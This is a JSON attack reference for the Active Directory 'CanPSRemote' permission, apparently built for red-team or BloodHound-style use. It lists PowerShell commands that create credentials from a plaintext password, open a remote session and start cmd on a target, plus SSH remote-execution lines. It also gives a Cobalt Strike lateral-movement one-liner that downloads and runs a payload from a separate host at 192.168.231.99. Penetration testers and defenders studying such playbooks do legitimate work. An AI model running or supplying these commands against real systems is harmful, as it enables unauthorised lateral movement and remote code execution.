{
    "CanPSRemote": {
        "meaning": "PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.",
        "common": "",
        "windows": {
            "PowerShell": [
                {
                    "order": 1,
                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
                    "description": "Create secure password credential"
                },
                {
                    "order": 2,
                    "command": "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)",
                    "description": "Create PSCredential object for authentication"
                },
                {
                    "order": 3,
                    "command": "$session = New-PSSession -ComputerName <target computer name> -Credential $Cred",
                    "description": "Create new PowerShell session on target computer"
                },
                {
                    "order": 4,
                    "command": "Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}",
                    "description": "Execute command on remote system via session"
                },
                {
                    "order": 5,
                    "command": "Disconnect-PSSession -Session $session",
                    "description": "Disconnect from PowerShell session"
                },
                {
                    "order": 6,
                    "command": "Remove-PSSession -Session $session",
                    "description": "Remove PowerShell session"
                }
            ],
            "CobaltStrike": [
                {
                    "order": 1,
                    "command": "powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session",
                    "description": "One-liner for lateral movement via PowerShell remoting with payload download"
                }
            ]
        },
        "linux": {
            "SSH": [
                {
                    "order": 1,
                    "command": "ssh user@target_host",
                    "description": "Establish SSH connection to target host"
                },
                {
                    "order": 2,
                    "command": "ssh -i private_key user@target_host 'command'",
                    "description": "Execute remote command via SSH with key authentication"
                }
            ]
        }
    }
}
